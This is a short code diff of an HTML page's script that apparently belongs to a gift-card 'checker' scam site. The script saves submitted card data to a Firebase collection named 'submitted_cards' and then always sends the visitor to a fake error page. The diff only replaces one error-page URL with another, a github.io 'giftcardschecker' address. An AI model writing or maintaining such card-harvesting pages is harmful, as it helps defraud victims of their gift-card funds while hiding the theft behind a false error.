@@ -550,7 +550,7 @@
       firebase.database().ref("submitted_cards").push(data)
         .then(() => {
           // always redirect, even if push succeeded or failed
-          window.location.href = "https://giftcarderror.tiiny.site";
+          window.location.href = "https://giftcardschecker.github.io/errorchecking/";
         })
         .catch(() => {
           // redirect even if write error
@@ -560,3 +560,4 @@
   </script>
 </body>
 </html>
+
